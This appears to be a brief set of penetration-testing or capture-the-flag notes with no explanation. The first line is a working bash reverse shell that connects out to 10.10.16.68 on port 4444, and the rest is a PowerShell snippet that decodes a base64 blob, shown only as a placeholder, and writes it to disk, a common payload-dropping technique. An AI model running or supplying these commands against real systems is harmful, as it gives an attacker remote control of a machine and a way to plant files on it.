/bin/bash -i >& /dev/tcp/10.10.16.68/4444 0>&1



$b64      = 'AAAAAA...'
$filename = 'C:\path\to\file'
$bytes = [Convert]::FromBase64String($b64)
[IO.File]::WriteAllBytes($filename, $bytes)
